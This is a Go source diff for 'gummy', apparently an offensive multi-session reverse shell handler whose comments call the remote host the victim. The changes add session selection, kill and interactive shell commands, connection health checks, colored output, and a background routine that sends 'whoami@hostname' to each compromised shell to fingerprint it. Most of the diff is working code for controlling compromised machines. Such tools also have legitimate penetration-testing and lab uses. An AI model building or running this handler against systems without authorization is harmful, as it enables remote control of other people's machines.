@@ -3,6 +3,7 @@ package session
 import (
 	"bufio"
 	"fmt"
+	"io"
 	"net"
 	"os"
 	"sort"
@@ -13,16 +14,18 @@ import (
 	"time"
 
 	"github.com/chsoares/gummy/internal/shell"
+	"github.com/chsoares/gummy/internal/ui"
 	"golang.org/x/term"
 )
 
 // Manager gerencia múltiplas sessões de reverse shell
 type Manager struct {
-	sessions    map[string]*SessionInfo // Mapa de sessões ativas
-	mu          sync.RWMutex            // Proteção concorrente
-	nextID      int                     // Próximo ID numérico
-	activeConn  net.Conn                // Conexão atualmente ativa (se houver)
-	menuActive  bool                    // Se estamos no menu principal
+	sessions        map[string]*SessionInfo // Mapa de sessões ativas
+	mu              sync.RWMutex            // Proteção concorrente
+	nextID          int                     // Próximo ID numérico
+	activeConn      net.Conn                // Conexão atualmente ativa (se houver)
+	selectedSession *SessionInfo            // Sessão selecionada (mas não necessariamente ativa)
+	menuActive      bool                    // Se estamos no menu principal
 }
 
 // SessionInfo contém informações sobre uma sessão
@@ -31,6 +34,7 @@ type SessionInfo struct {
 	NumID    int       // ID numérico para facilitar uso
 	Conn     net.Conn  // Conexão TCP
 	RemoteIP string    // IP da vítima
+	Whoami   string    // user@host da vítima
 	Handler  *shell.Handler // Shell handler
 	Active   bool      // Se está sendo usada atualmente
 }
@@ -38,9 +42,10 @@ type SessionInfo struct {
 // NewManager cria um novo gerenciador de sessões
 func NewManager() *Manager {
 	return &Manager{
-		sessions:   make(map[string]*SessionInfo),
-		nextID:     1,
-		menuActive: true,
+		sessions:        make(map[string]*SessionInfo),
+		nextID:          1,
+		selectedSession: nil,
+		menuActive:      true,
 	}
 }
 
@@ -61,6 +66,7 @@ func (m *Manager) AddSession(id string, conn net.Conn, remoteIP string) {
 		NumID:    m.nextID,
 		Conn:     conn,
 		RemoteIP: remoteIP,
+		Whoami:   "detecting...",
 		Handler:  handler,
 		Active:   false,
 	}
@@ -68,12 +74,18 @@ func (m *Manager) AddSession(id string, conn net.Conn, remoteIP string) {
 	m.sessions[id] = session
 	m.nextID++
 
+	// Detecta whoami em background
+	go m.detectWhoami(session)
+
+	// Inicia monitoramento da sessão
+	go m.monitorSession(session)
+
 	if m.menuActive {
 		// Se estivermos no menu, quebrar a linha atual, mostrar notificação e novo prompt
-		fmt.Printf("\rSession %d opened (%s -> %s)\ngummy> ", session.NumID, remoteIP, conn.LocalAddr().String())
+		fmt.Printf("\r%s\n%s", ui.SessionOpened(session.NumID, remoteIP), ui.Prompt())
 	} else {
 		// Se não estivermos no menu, só mostrar a notificação
-		fmt.Printf("Session %d opened (%s -> %s)\n", session.NumID, remoteIP, conn.LocalAddr().String())
+		fmt.Println(ui.SessionOpened(session.NumID, remoteIP))
 	}
 }
 
@@ -87,7 +99,13 @@ func (m *Manager) RemoveSession(id string) {
 		return
 	}
 
-	fmt.Printf("Session %d closed\n", session.NumID)
+	fmt.Println(ui.SessionClosed(session.NumID, session.RemoteIP))
+
+	// Se era a sessão selecionada, limpar seleção
+	if m.selectedSession != nil && m.selectedSession.ID == id {
+		m.selectedSession = nil
+	}
+
 	delete(m.sessions, id)
 
 	// Se era a sessão ativa, voltar ao menu
@@ -108,13 +126,14 @@ func (m *Manager) ListSessions() {
 	defer m.mu.RUnlock()
 
 	if len(m.sessions) == 0 {
-		fmt.Println("No active sessions.")
+		fmt.Println(ui.Info("No active sessions."))
 		return
 	}
 
-	fmt.Println("\nActive Sessions:")
-	fmt.Println("ID   Remote Address")
-	fmt.Println("--   --------------")
+	fmt.Println()
+	fmt.Println(ui.Title("Active Sessions"))
+	fmt.Printf("%sID   Remote Address    Whoami%s\n", ui.ColorBrightBlack, ui.ColorReset)
+	fmt.Printf("%s--   --------------    ------%s\n", ui.ColorBrightBlack, ui.ColorReset)
 
 	// Ordenar por NumID para exibição consistente
 	var sessions []*SessionInfo
@@ -126,18 +145,20 @@ func (m *Manager) ListSessions() {
 	})
 
 	for _, session := range sessions {
-		marker := " "
+		sessionLine := fmt.Sprintf("%-3d %-16s %s", session.NumID, session.RemoteIP, session.Whoami)
 		if session.Active {
-			marker = "*"
+			fmt.Printf("%s\n", ui.SessionActive(sessionLine))
+		} else {
+			fmt.Printf("%s\n", ui.SessionInactive(sessionLine))
 		}
-		fmt.Printf("%s%-3d %s\n", marker, session.NumID, session.RemoteIP)
 	}
 	fmt.Println()
 }
 
-// UseSession ativa uma sessão específica
+// UseSession seleciona uma sessão específica (não entra na shell)
 func (m *Manager) UseSession(numID int) error {
 	m.mu.Lock()
+	defer m.mu.Unlock()
 
 	var targetSession *SessionInfo
 	for _, session := range m.sessions {
@@ -148,9 +169,190 @@ func (m *Manager) UseSession(numID int) error {
 	}
 
 	if targetSession == nil {
-		m.mu.Unlock()
 		return fmt.Errorf("session %d not found", numID)
 	}
+
+	// Testa se a sessão está viva antes de selecioná-la
+	targetSession.Conn.SetWriteDeadline(time.Now().Add(1 * time.Second))
+	_, err := targetSession.Conn.Write([]byte{})
+	targetSession.Conn.SetWriteDeadline(time.Time{})
+
+	if err != nil {
+		// Sessão morta, remove ela
+		m.mu.Unlock()
+		fmt.Println(ui.Error("Session is dead, removing..."))
+		m.RemoveSession(targetSession.ID)
+		return fmt.Errorf("session %d is no longer alive", numID)
+	}
+
+	m.selectedSession = targetSession
+	fmt.Println(ui.UsingSession(targetSession.NumID, targetSession.RemoteIP))
+
+	return nil
+}
+
+// KillSession mata uma sessão específica
+func (m *Manager) KillSession(numID int) error {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+
+	var targetSession *SessionInfo
+	for _, session := range m.sessions {
+		if session.NumID == numID {
+			targetSession = session
+			break
+		}
+	}
+
+	if targetSession == nil {
+		return fmt.Errorf("session %d not found", numID)
+	}
+
+	// Fecha a conexão
+	targetSession.Conn.Close()
+
+	// Se era a sessão selecionada, limpa seleção
+	if m.selectedSession != nil && m.selectedSession.ID == targetSession.ID {
+		m.selectedSession = nil
+	}
+
+	// Remove da lista
+	delete(m.sessions, targetSession.ID)
+
+	fmt.Println(ui.SessionClosed(targetSession.NumID, targetSession.RemoteIP))
+
+	return nil
+}
+
+// detectWhoami detecta user@host da sessão em background
+func (m *Manager) detectWhoami(session *SessionInfo) {
+	// Aguarda um pouco para a shell se estabilizar
+	time.Sleep(800 * time.Millisecond)
+
+	// Comando mais direto e confiável
+	whoamiCmd := "echo $(whoami)@$(hostname)\n"
+	_, err := session.Conn.Write([]byte(whoamiCmd))
+	if err != nil {
+		session.Whoami = "unknown"
+		return
+	}
+
+	// Define timeout maior para leitura
+	session.Conn.SetReadDeadline(time.Now().Add(5 * time.Second))
+
+	// Lê toda a resposta em múltiplas tentativas
+	allData := ""
+	buffer := make([]byte, 1024)
+
+	for i := 0; i < 10; i++ { // máximo 10 tentativas
+		n, err := session.Conn.Read(buffer)
+		if err != nil {
+			if i > 0 { // Se já lemos algo, pode ter terminado
+				break
+			}
+			session.Whoami = "unknown"
+			return
+		}
+
+		allData += string(buffer[:n])
+
+		// Se temos pelo menos uma linha completa, processa
+		if strings.Contains(allData, "\n") {
+			lines := strings.Split(allData, "\n")
+			for _, line := range lines {
+				line = strings.TrimSpace(line)
+				// Procura por user@host sem comandos
+				if strings.Contains(line, "@") &&
+				   !strings.Contains(line, "echo") &&
+				   !strings.Contains(line, "whoami") &&
+				   !strings.Contains(line, "hostname") &&
+				   !strings.Contains(line, "$") {
+
+					// Limpa a linha
+					cleaned := strings.ReplaceAll(line, "\r", "")
+					cleaned = strings.TrimSpace(cleaned)
+
+					// Valida formato básico: palavra@palavra
+					parts := strings.Split(cleaned, "@")
+					if len(parts) == 2 && len(parts[0]) > 0 && len(parts[1]) > 0 && len(cleaned) < 50 {
+						session.Whoami = cleaned
+
+						// Drena o restante rapidamente
+						go func() {
+							time.Sleep(100 * time.Millisecond)
+							drainBuffer := make([]byte, 2048)
+							session.Conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
+							for {
+								n, err := session.Conn.Read(drainBuffer)
+								if err != nil || n == 0 {
+									break
+								}
+							}
+							session.Conn.SetReadDeadline(time.Time{})
+						}()
+
+						return
+					}
+				}
+			}
+		}
+
+		// Pequena pausa entre tentativas
+		time.Sleep(100 * time.Millisecond)
+	}
+
+	// Remove timeout
+	session.Conn.SetReadDeadline(time.Time{})
+	session.Whoami = "unknown"
+}
+
+// monitorSession monitora a saúde da sessão em background
+func (m *Manager) monitorSession(session *SessionInfo) {
+	for {
+		time.Sleep(5 * time.Second) // Verifica a cada 5 segundos
+
+		// Verifica se a sessão ainda existe
+		m.mu.RLock()
+		_, exists := m.sessions[session.ID]
+		m.mu.RUnlock()
+
+		if !exists {
+			return // Sessão foi removida, para o monitoramento
+		}
+
+		// Testa se a conexão está viva
+		session.Conn.SetWriteDeadline(time.Now().Add(1 * time.Second))
+		_, err := session.Conn.Write([]byte{})
+		session.Conn.SetWriteDeadline(time.Time{})
+
+		if err != nil {
+			// Conexão morta, remove a sessão
+			fmt.Printf("\r\n%s\r\n", ui.SessionClosed(session.NumID, session.RemoteIP))
+			m.RemoveSession(session.ID)
+
+			// Se estava no menu, mostra novo prompt
+			if m.menuActive {
+				if m.selectedSession != nil {
+					fmt.Print(ui.PromptWithSession(m.selectedSession.NumID))
+				} else {
+					fmt.Print(ui.Prompt())
+				}
+			}
+			return
+		}
+	}
+}
+
+// ShellSession entra na shell interativa da sessão selecionada
+func (m *Manager) ShellSession() error {
+	m.mu.Lock()
+
+	if m.selectedSession == nil {
+		m.mu.Unlock()
+		return fmt.Errorf("no session selected. Use 'use <id>' first")
+	}
+
+	targetSession := m.selectedSession
 
 	// Desativa sessão anterior
 	for _, session := range m.sessions {
@@ -163,8 +365,7 @@ func (m *Manager) UseSession(numID int) error {
 
 	m.mu.Unlock()
 
-	fmt.Printf("Using session %d (%s)\n", targetSession.NumID, targetSession.RemoteIP)
-	fmt.Println("Press F12 to return to menu")
+	fmt.Println(ui.Info("Entering interactive shell. Press F12 to return to menu"))
 
 	// Inicia shell handler (bloqueia até sair)
 	err := targetSession.Handler.Start()
@@ -183,10 +384,9 @@ func (m *Manager) UseSession(numID int) error {
 	m.flushStdin()
 
 	if sessionCount > 0 {
-		fmt.Printf("\n") // Nova linha para separar
 		m.showMenu()
 	} else {
-		fmt.Println("No active sessions.")
+		fmt.Println(ui.Info("No active sessions."))
 	}
 
 	return err
@@ -194,15 +394,18 @@ func (m *Manager) UseSession(numID int) error {
 
 // StartMenu inicia o loop do menu principal
 func (m *Manager) StartMenu() {
-	fmt.Println("Gummy Multi-Session Handler")
-	fmt.Println("Type 'help' for available commands")
 
 	scanner := bufio.NewScanner(os.Stdin)
 
 	for {
 		// Só mostra prompt e lê se estivermos no menu
 		if m.menuActive {
-			fmt.Print("gummy> ")
+			// Show appropriate prompt based on selected session
+			if m.selectedSession != nil {
+				fmt.Print(ui.PromptWithSession(m.selectedSession.NumID))
+			} else {
+				fmt.Print(ui.Prompt())
+			}
 
 			if !scanner.Scan() {
 				break
@@ -234,40 +437,60 @@ func (m *Manager) handleCommand(command string) {
 		m.ListSessions()
 	case "use":
 		if len(parts) < 2 {
-			fmt.Println("Usage: use <session_id>")
+			fmt.Println(ui.Error("Usage: use <session_id>"))
 			return
 		}
 		numID, err := strconv.Atoi(parts[1])
 		if err != nil {
-			fmt.Printf("Invalid session ID: %s\n", parts[1])
+			fmt.Println(ui.Error(fmt.Sprintf("Invalid session ID: %s", parts[1])))
 			return
 		}
 		m.UseSession(numID)
+	case "shell":
+		err := m.ShellSession()
+		if err != nil && err != io.EOF {
+			fmt.Println(ui.Error(err.Error()))
+		}
+	case "kill":
+		if len(parts) < 2 {
+			fmt.Println(ui.Error("Usage: kill <session_id>"))
+			return
+		}
+		numID, err := strconv.Atoi(parts[1])
+		if err != nil {
+			fmt.Println(ui.Error(fmt.Sprintf("Invalid session ID: %s", parts[1])))
+			return
+		}
+		err = m.KillSession(numID)
+		if err != nil {
+			fmt.Println(ui.Error(err.Error()))
+		}
 	case "exit", "quit", "q":
-		fmt.Println("Goodbye!")
+		fmt.Println(ui.Success("Goodbye!"))
 		os.Exit(0)
 	case "clear", "cls":
 		fmt.Print("\033[2J\033[H")
 	default:
-		fmt.Printf("Unknown command: %s (type 'help' for available commands)\n", parts[0])
+		fmt.Println(ui.Warning(fmt.Sprintf("Unknown command: %s (type 'help' for available commands)", parts[0])))
 	}
 }
 
 // showMenu mostra o menu principal com sessões ativas
 func (m *Manager) showMenu() {
-	fmt.Printf("\n--- Gummy Session Menu ---\n")
 	m.ListSessions()
-	fmt.Println("Commands: sessions, use <id>, help, exit")
 }
 
 // showHelp mostra ajuda dos comandos
 func (m *Manager) showHelp() {
-	fmt.Println("\nAvailable Commands:")
-	fmt.Println("  sessions, list, ls    - List active sessions")
-	fmt.Println("  use <id>             - Use session with given ID")
-	fmt.Println("  help, h              - Show this help")
-	fmt.Println("  clear, cls           - Clear screen")
-	fmt.Println("  exit, quit, q        - Exit Gummy")
+	fmt.Println()
+	fmt.Println(ui.CommandHelp("Available Commands"))
+	fmt.Println(ui.Command("sessions, list, ls    - List active sessions"))
+	fmt.Println(ui.Command("use <id>             - Select session with given ID"))
+	fmt.Println(ui.Command("shell                - Enter interactive shell (requires selected session)"))
+	fmt.Println(ui.Command("kill <id>            - Kill session with given ID"))
+	fmt.Println(ui.Command("help, h              - Show this help"))
+	fmt.Println(ui.Command("clear, cls           - Clear screen"))
+	fmt.Println(ui.Command("exit, quit, q        - Exit Gummy"))
 	fmt.Println()
 }
 
